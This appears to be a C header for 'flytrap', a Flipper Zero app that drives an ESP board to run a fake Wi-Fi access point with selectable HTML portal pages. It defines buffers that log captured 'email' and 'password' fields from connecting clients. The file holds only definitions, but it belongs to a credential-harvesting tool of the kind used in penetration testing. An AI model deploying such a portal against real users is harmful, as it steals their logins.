#pragma once

#include <furi.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/scene_manager.h>
#include <gui/modules/submenu.h>
#include <gui/modules/text_input.h>
#include <gui/modules/widget.h>
#include <dialogs/dialogs.h>
#include <storage/storage.h>

#include "flytrap_uart.h"
#include "flytrap_custom_event.h"
#include "scenes/flytrap_scene.h"

#define FLYTRAP_SSID_MAX (33) // 32 chars + NUL
#define FLYTRAP_HTML_MAX (24000)
#define FLYTRAP_CAP_SLOTS (8)
#define FLYTRAP_CAP_KV_SIZE (96)
#define FLYTRAP_LINE_MAX (512)

#define FLYTRAP_DATA_DIR EXT_PATH("apps_data/flytrap")
#define FLYTRAP_PORTALS_DIR FLYTRAP_DATA_DIR "/portals"
#define FLYTRAP_CONFIG_PATH FLYTRAP_DATA_DIR "/config.txt"
#define FLYTRAP_LOGS_DIR FLYTRAP_DATA_DIR "/logs"

typedef enum {
    FlytrapViewSubmenu,
    FlytrapViewTextInput,
    FlytrapViewWidget,
} FlytrapView;

typedef struct {
    char kv[FLYTRAP_CAP_KV_SIZE]; // urlencoded captured fields, e.g. "email=..&password=.."
} FlytrapCapture;

typedef struct FlytrapApp {
    Gui* gui;
    ViewDispatcher* view_dispatcher;
    SceneManager* scene_manager;
    DialogsApp* dialogs;

    Submenu* submenu;
    TextInput* text_input;
    Widget* widget;

    FlytrapUart* uart;

    // Config / selection
    FuriString* ssid; // AP name, persisted to config.txt
    FuriString* portal_path; // absolute path of selected .html
    char ssid_buf[FLYTRAP_SSID_MAX]; // TextInput backing buffer

    // Live session state (written by UART worker, read by GUI on refresh)
    FuriString* line_acc; // RX line assembler
    FuriString* status; // last status token, shown on the widget
    FuriString* log_path; // this session's capture log path
    FuriString* legacy_user; // holds a legacy "u:" line until the matching "p:"
    FlytrapCapture captures[FLYTRAP_CAP_SLOTS];
    uint8_t cap_head; // ring write index
    uint16_t cap_count; // total captures this session
    uint16_t client_count; // total client hits this session

    // Handshake flags (all touched only on the GUI thread)
    bool portal_running;
    bool pending_setap; // armed after sethtml, fires on STATUS html_ok
    bool session_active; // true while the Live scene owns the portal
    bool need_restart; // set when the ESP reports "boot" mid-session -> resend
} FlytrapApp;
